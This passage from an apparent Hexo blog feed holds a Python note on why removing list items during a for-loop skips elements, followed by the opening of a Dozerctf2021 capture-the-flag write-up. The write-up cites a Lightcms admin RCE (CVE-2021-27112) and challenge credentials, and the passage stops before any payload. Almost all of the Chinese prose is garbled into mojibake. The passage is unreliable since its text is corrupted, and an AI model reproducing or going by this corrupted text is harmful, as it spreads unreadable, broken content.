&#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;å‰©ä½™ä»»åŠ¡ï¼š3 ä¸ª[&#39;C++&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š2 ä¸ª[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;errorå‰©ä½™ä»»åŠ¡ï¼š2 ä¸ª[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š1 ä¸ª[&#39;C++&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;All Done!test2new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š8 ä¸ª[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š7 ä¸ª[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;sql&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š6 ä¸ª[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;errornew cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š6 ä¸ª[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;errornew cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š6 ä¸ª[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š5 ä¸ª[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;go&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š4 ä¸ª[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š3 ä¸ª[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Python&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š2 ä¸ª[&#39;C&#39;, &#39;C++&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š1 ä¸ª[&#39;C&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C&#39;&#125;All Done!</code></pre><hr><h2 id="ä»»åŠ¡æ¦‚å†µ"><a href="#ä»»åŠ¡æ¦‚å†µ" class="headerlink" title="ä»»åŠ¡æ¦‚å†µ"></a>ä»»åŠ¡æ¦‚å†µ</h2><p>è¿™ä¸ªè„šæœ¬æ˜¯ä¸ºäº†å®ŒæˆæŸä»»åŠ¡ï¼Œå°†æ‰€æœ‰ç”¨æˆ·å­˜å‚¨åœ¨ä¸€ä¸ªlisté‡Œï¼Œå³</p><pre class="language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C++"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Python"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"PHP"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"go"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Java"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"sql"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"solidity"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span></code></pre><p>å¯¹äºæ­¤ä»»åŠ¡ï¼Œä¸­é—´è¿‡ç¨‹ç›´æ¥çœç•¥ï¼Œæœ‰æ¦‚ç‡(ä¸å¯å®šå› ç´ )ä¼šå¤±è´¥ï¼Œæ‰€ä»¥æœ‰è¡¥é”™æªæ–½ã€‚</p><p>å‡ä½¿æœ¬ä»»åŠ¡è¡¥é”™æªæ–½å®Œæ•´ï¼Œä¸ä¼šå‡ºç°æ­»å¾ªç¯æƒ…å†µã€‚</p><p>å¯¹äºæœ¬æµ‹è¯•ï¼Œæ¨¡æ‹Ÿå‡ºé”™è®°å½•æ¬¡æ•°timeä¸º2æ¬¡ã€‚</p><hr><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><h3 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h3><h4 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nnew cycle!==========\n"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> user <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""xxx"""</span></code></pre><p>å¯è§å¯¹äºlistä¸­(ä¸‹ç§°ç”¨æˆ·é›†)çš„æ¯ä¸ªdict(ä¸‹ç§°ç”¨æˆ·)èµ‹ç»™userï¼Œç„¶åè¿›è¡Œå¤„ç†ä»»åŠ¡(ä¸‹ç§°ä»»åŠ¡)ï¼Œç”±äº<code>while data</code> å¿…é¡»æ‰€æœ‰ç”¨æˆ·å…¨éƒ¨å®Œæˆä»»åŠ¡æ‰ä¼šç»“æŸã€‚</p><h4 id="åŸæ€æƒ³ï¼š"><a href="#åŸæ€æƒ³ï¼š" class="headerlink" title="åŸæ€æƒ³ï¼š"></a>åŸæ€æƒ³ï¼š</h4><p>å¯¹äºæ¯ä¸ªç”¨æˆ·å…ˆå…¨éƒ¨åšä¸€éä»»åŠ¡ï¼Œç„¶åå‡ºé”™çš„ç”¨æˆ·ç”±è¡¥é”™æªæ–½è¡¥é”™</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> xxxx<span class="token punctuation">:</span>  <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    data<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>user<span class="token punctuation">)</span></code></pre><p>å¦‚ä¸Šï¼Œæ¨¡æ‹Ÿå®Œæˆä»»åŠ¡å°±ä»ç”¨æˆ·é›†ä¸­ç§»å‡ºæ­¤ç”¨æˆ·ï¼Œç„¶åå¦‚æœæœ‰ä»»åŠ¡å‡ºé”™ï¼Œç”¨æˆ·è¿˜åœ¨ç”¨æˆ·é›†é‡Œï¼Œè¾“å‡ºä¸€è¡Œ<code>new cycle!==========</code>ï¼Œç»§ç»­æ‰§è¡Œä»»åŠ¡ã€‚</p><p>ç„¶è€Œæœ€ç»ˆè¾“å‡ºå´æ˜¯å¦‚ä¸‹</p><pre class="language-none"><code class="language-none">test1new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š8 ä¸ª[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C&#39;&#125;å‰©ä½™ä»»åŠ¡ï¼š7 ä¸ª[&#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Python&#39;&#125;å‰©ä½™ä»»åŠ¡ï¼š6 ä¸ª[&#39;C++&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;go&#39;&#125;å‰©ä½™ä»»åŠ¡ï¼š5 ä¸ª[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;sql&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š4 ä¸ª[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;errorå‰©ä½™ä»»åŠ¡ï¼š4 ä¸ª[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;å‰©ä½™ä»»åŠ¡ï¼š3 ä¸ª[&#39;C++&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š2 ä¸ª[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;errorå‰©ä½™ä»»åŠ¡ï¼š2 ä¸ª[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š1 ä¸ª[&#39;C++&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;All Done!</code></pre><p>å‡ºç°äº†4æ¬¡<code>new cycle!==========</code></p><h4 id="å®é™…æƒ…å†µï¼š"><a href="#å®é™…æƒ…å†µï¼š" class="headerlink" title="å®é™…æƒ…å†µï¼š"></a>å®é™…æƒ…å†µï¼š</h4><p>é€šè¿‡debugï¼Œå¯ä»¥çœ‹åˆ°</p><p>ç¬¬ä¸€æ¬¡ï¼š</p><img src="/article/pythondict/image-20210608170630964.png" class="" title="image-20210608170630964" loading="lazy"><p>ç§»å‡ºåï¼š</p><img src="/article/pythondict/image-20210608170648260.png" class="" title="image-20210608170648260" loading="lazy"><p>è¿™é‡Œå¹¶æ²¡æœ‰ä»€ä¹ˆå¼‚å¸¸ï¼Œæˆ‘ä»¬è¿‡å››æ¬¡çœ‹çœ‹</p><p>ç¬¬å››æ¬¡ï¼š</p><img src="/article/pythondict/image-20210608170759998.png" class="" title="image-20210608170759998" loading="lazy"><p>ç§»å‡ºåï¼š</p><img src="/article/pythondict/image-20210608170807924.png" class="" title="image-20210608170807924" loading="lazy"><p>ç„¶åï¼Œå®ƒç«Ÿç„¶è·³å‡ºäº†forå¾ªç¯</p><img src="/article/pythondict/image-20210608171051661.png" class="" title="image-20210608171051661" loading="lazy"><p>ä¹Ÿå°±æ˜¯è¯´<code>for user in data</code>å·²ç»èµ°å®Œä¸€éäº†</p><p>åé¢å‡ æ¬¡åŒç†</p><h4 id="åŸå› ï¼š"><a href="#åŸå› ï¼š" class="headerlink" title="åŸå› ï¼š"></a>åŸå› ï¼š</h4><p>æœ¬äººæ‰ç–å­¦æµ…ï¼Œç•¥æœ‰æ‹™è§ï¼Œå¦‚æœ‰é”™è¯¯è¿˜è¯·å¤§ä½¬æŒ‡æ­£ï¼</p><p>ç»è¿‡è€ƒè™‘ï¼Œè§‰å¾—åŸå› å¦‚ä¸‹</p><p>pythonçš„å˜é‡å®šä¹‰å¹¶æ²¡æœ‰é‚£ä¹ˆä¸¥æ ¼ï¼Œå‡­æ„Ÿè§‰è¯´ï¼Œåƒæ˜¯ä¸€ç§å®¹å™¨ã€‚</p><p><code>for user in data</code>ï¼Œå…¶å®å°±æ˜¯userå¯¹äºdataå¤„çš„æŒ‡é’ˆï¼Œæˆ‘ä»¬åšä¸ªå°æµ‹è¯•</p><pre class="language-python" data-language="python"><code class="language-python">dictlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">6</span><span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">8</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> dictlist<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    dictlist<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>i<span class="token punctuation">)</span></code></pre><p>çŒœçŒœç»“æœæ€ä¹ˆæ ·ï¼Ÿ</p><details>  <summary>ç»“æœå¦‚ä¸‹</summary>{1: 1}{3: 3}{5: 5}{7: 7}</details><p>å¯è§ï¼Œåªè¾“å‡ºäº†å•æ•°ä½</p><p><code>for i in datalist</code>æµ‹è¯•<code>datalist</code>é‡Œçš„å€¼</p><p>ç¬¬ä¸€æ¬¡ï¼Œå³ä¸º <code>datalist[0]</code>ï¼ˆè¿™é‡Œä¸è§„èŒƒåœ°ç”¨æ•°ç»„æ¥è¡¨ç¤ºï¼Œæ¯”è¾ƒç›´è§‚ï¼‰</p><p>æœ‰å€¼ä¸º{1: 1}ï¼Œä»»åŠ¡è¿›è¡Œ</p><p>ç»“æŸå<code>dictlist.remove(i)</code></p><p>æ­¤æ—¶<code>dictlist-&gt;[&#123;2: 2&#125;, &#123;3: 3&#125;, &#123;4: 4&#125;, &#123;5: 5&#125;, &#123;6: 6&#125;, &#123;7: 7&#125;, &#123;8: 8&#125;]</code> </p><p>ç¬¬äºŒæ¬¡ä¸º<code>datalist[1]-&gt;&#123;3: 3&#125;</code></p><p>åˆ™å¯ä»¥è®¤å®šï¼Œå¯¹äºdictçš„removeæ˜¯å³æ—¶å®Œæˆï¼Œè€Œiä½œä¸º<code>in data</code>çš„æŒ‡ä»£ï¼Œå…¶å®åªæ˜¯<code>for(int i=0;i&lt;data.length;i++)</code>çš„ç­‰ä»·ä»£æ¢ã€‚(æ­¤å¤„çš„è¡¨è¾¾å¹¶ä¸è§„èŒƒï¼Œä»…ä½œç¤ºæ„å‚è€ƒ)</p><p>å½“ç¬¬å››æ¬¡æ—¶ï¼Œ<code>dictlist-&gt;[&#123;2: 2&#125;, &#123;4: 4&#125;, &#123;6: 6&#125;, &#123;7: 7&#125;, &#123;8: 8&#125;]</code> </p><p><code>datalist[3]-&gt;&#123;7: 7&#125;</code>ï¼Œremove it.</p><p>ç¬¬äº”æ¬¡ï¼Œ<code>dictlist-&gt;[&#123;2: 2&#125;, &#123;4: 4&#125;, &#123;6: 6&#125;, &#123;8: 8&#125;]</code></p><p><code>datalist[4]-&gt;NULL</code>è·³å‡ºäº†å¾ªç¯</p><img src="/article/pythondict/image-20210608184852589.png" class="" title="image-20210608184852589" loading="lazy"><h5 id="é—®é¢˜ç¼˜ç”±"><a href="#é—®é¢˜ç¼˜ç”±" class="headerlink" title="é—®é¢˜ç¼˜ç”±"></a>é—®é¢˜ç¼˜ç”±</h5><p>å†™äº†ä¸ªå°è„šæœ¬ï¼Œå‡†å¤‡æŒ‰ç”¨æˆ·é¡ºåºå¤„ç†ä»»åŠ¡ï¼Œç»“æœå‘ç°å¹¶æ²¡æœ‰æŒ‰é¡ºåºæ‰§è¡Œï¼Œç„¶åè¾“å‡ºcycleåï¼Œå‘ç°æŒ‰å•æ•°æ‰§è¡Œäº†ç¬¬ä¸€éï¼Œè¿›ä¸€æ­¥æ·±ç©¶ã€‚å‘ç°äº†è¿™ä¸ªæƒ…å†µã€‚</p><hr><h3 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h3><p>é‚£å¦‚æœæˆ‘ç›´æ¥popå‡ºdictå‘¢ï¼Ÿ</p><h4 id="ä»£ç -1"><a href="#ä»£ç -1" class="headerlink" title="ä»£ç "></a>ä»£ç </h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> data<span class="token punctuation">:</span>  user <span class="token operator">=</span> data<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="åŸæ€æƒ³ï¼š-1"><a href="#åŸæ€æƒ³ï¼š-1" class="headerlink" title="åŸæ€æƒ³ï¼š"></a>åŸæ€æƒ³ï¼š</h4><p>æ—¢ç„¶forä¼šæœ‰è¶Šç•Œé—®é¢˜(ä¼¼ä¹Pythonå¹¶ä¸è§‰å¾—è¿™æ˜¯ä¸ªé—®é¢˜hhh)ï¼Œé‚£ä¹ˆå¦‚æœæ¢ç§æ–¹å¼å‘¢ã€‚</p><p>æ¯æ¬¡ç›´æ¥popå‡ºä¸€ä¸ªç”¨æˆ·ï¼Œç„¶åæ‰§è¡Œä»»åŠ¡ï¼Œå¦‚æœå‡ºé”™å°±æŠŠè¿™ä¸ªç”¨æˆ·åŠ å›ç”¨æˆ·é›†</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>  data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user<span class="token punctuation">)</span> </code></pre><p>è¿™æ ·ä¸€æ¥ï¼Œç¡®å®æ²¡å•¥é—®é¢˜</p><h4 id="å®é™…æƒ…å†µï¼š-1"><a href="#å®é™…æƒ…å†µï¼š-1" class="headerlink" title="å®é™…æƒ…å†µï¼š"></a>å®é™…æƒ…å†µï¼š</h4><p>å¯¹äºæœ¬æµ‹è¯•ï¼Œä¸éœ€è¦è€ƒè™‘å…¶ä»–å› ç´ ï¼Œè€Œå¯¹äºæ’¸çš„é‚£ä¸ªè„šæœ¬ï¼Œä¸€èˆ¬æ˜¯ä¸ä¼šå‡ºé”™ï¼Œå¦‚æœå‡ºé”™åº”è¯¥æ˜¯ä¸€æ®µæ—¶é—´å†…å‡ºé”™ï¼Œå³æ— æ³•ç«‹åˆ»è§£å†³ï¼Œéœ€è¦ç­‰å¾…ï¼ˆä¾‹å¦‚è¿™ä¸ªç”¨æˆ·ä»Šå¤©ä¸éœ€è¦æ‰§è¡Œè¿™ä¸ªä»»åŠ¡ï¼Œè¡¥æ•‘è¾¾åˆ°ä¸Šé™æ‰ä¼šæ‰§è¡Œå…¶ä»–ç”¨æˆ·ä»»åŠ¡ï¼Œä¼šå¤§å¤§æ‹–å»¶è„šæœ¬çš„è¿è¡Œé€Ÿåº¦ï¼‰ï¼Œè¿™æ—¶å€™å¦‚test1å…ˆæ‰§è¡Œå…¶ä»–ç”¨æˆ·ä»»åŠ¡å³å¯ã€‚</p><p>ä½†åœ¨å®é™…è„šæœ¬ä¸­ï¼Œç”±äºè¡¥é”™æªæ–½ï¼Œç¨‹åºä¸å†™å¥½è¡¥é”™ä¸Šé™å°±ä¼šé™·å…¥æ­»å¾ªç¯ã€‚</p><h4 id="åŸå› ï¼š-1"><a href="#åŸå› ï¼š-1" class="headerlink" title="åŸå› ï¼š"></a>åŸå› ï¼š</h4><p>é—®é¢˜åœ¨äºï¼Œpopä¼šå¼¹å‡ºç”¨æˆ·é›†æœ€åä¸€ä¸ªç”¨æˆ·ï¼Œè€Œä¸€æ—¦å‡ºç°é”™è¯¯ï¼Œè¡¥é”™æªæ–½æ˜¯å°†å…¶appendå›ç”¨æˆ·é›†ï¼Œå³è¿˜æ˜¯æœ€åä¸€ä¸ªç”¨æˆ·ï¼Œè¿™æ ·å°±ä¼šé€ æˆæ­»å¾ªç¯</p><p>è¿™é‡Œä¸èƒ½ç”¨<code>data[&#39;xxx&#39;]=xxx</code>ï¼Œå› ä¸ºå®é™…dictæœ‰å¾ˆå¤šé”®å€¼å¯¹</p><p>æ²¡å•¥å¥½çš„æ ¹æœ¬è§£å†³æ–¹æ³•ï¼Œå’±ä¸æ˜¯æç®—æ³•å’Œå¼€å‘çš„ï¼Œæ²¡æœ‰æ·±ç©¶è¿™é‡Œé¢çš„æ–¹æ³•ï¼Œå¦‚æœ‰æ–¹æ³•è¯·å¸ˆå‚…ä»¬æŒ‡æ•™ã€‚</p><hr><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ€åè„šæœ¬è¿˜æ˜¯test1çš„æ–¹å¼æ²¡æœ‰å˜äº†ï¼Œæ—¢ç„¶Pythonæ²¡æœ‰å¯¹è¶Šç•Œåšå•¥è¡¨ç¤ºï¼Œå’±ä¹Ÿå°±è¿™æ ·ç”¨ç€å°±å¥½å•¦</p><p>è¿™æ˜¯èœé¸¡æ‘¸é±¼æ’¸æ’¸å°è„šæœ¬æ—¶å€™é‡åˆ°çš„å°æƒ…å†µï¼Œä¹Ÿç®—æ˜¯ä¸€ä¸ªå­¦ä¹ è®°å½•å§ï¼Œè¿˜æ²¡æœ‰ç³»ç»Ÿæ€§åœ°å­¦ä¹ Pythonï¼Œå¯èƒ½å­¦åˆ°äº†å°±ä¼šæœ‰æ–¹æ³•å¯ä»¥è§£å†³äº†å§â€¦</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆç¬”è®° </category>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Dozerctf2021</title>
      <link href="article/dozerctf2021/"/>
      <url>article/dozerctf2021/</url>
      
        <content type="html"><![CDATA[<p>é˜Ÿä¼åç§°ï¼šæˆˆæˆˆå“¥å“¥ä¸é¸½é¸½</p><a id="more"></a><p>å¤§å¸ˆå‚…ä»¬éƒ½å»æ‰“xctfäº†ï¼Œå‡ ä¸ªæ¯”èµ›é‡æ—¶é—´äº†ï¼Œæ˜¥ç§‹ï¼Œç¾å›¢ï¼Œdasã€‚</p><p>åœ¨å‡ ä¸ªæ¯”èµ›ä¸­ç–¯ç‹‚è¡”æ¥2333</p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ç®€å•åŸŸæ¸—é€â…¡-1"><a href="#ç®€å•åŸŸæ¸—é€â…¡-1" class="headerlink" title="ç®€å•åŸŸæ¸—é€â…¡-1"></a>ç®€å•åŸŸæ¸—é€â…¡-1</h3><p>æ‹¿åˆ°é¢˜Lightcmsï¼Œç›´æ¥æ‰“ã€‚ç›®å‰ç½‘ä¸Šä¸¤ä¸ªæ´ï¼Œä¸€ä¸ªvè·¨ç«™è„šæœ¬æ¼æ´ï¼Œä¸€ä¸ªåå°RCEæ¼æ´<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27112">CVE-2021-27112</a></p><p>dozer/dozer123ç™»é™†åå°</p><img src="/article/dozerctf2021/image-20210530221322010.png" class="" title="image-20210530221322010" loading="lazy"><p>åœ¨<code>å†…å®¹ç®¡ç†-&gt;æ–‡ç« -&gt;æ–°å»ºæ–‡ç« å†…å®¹</code>å¤„ä¸Šä¼ 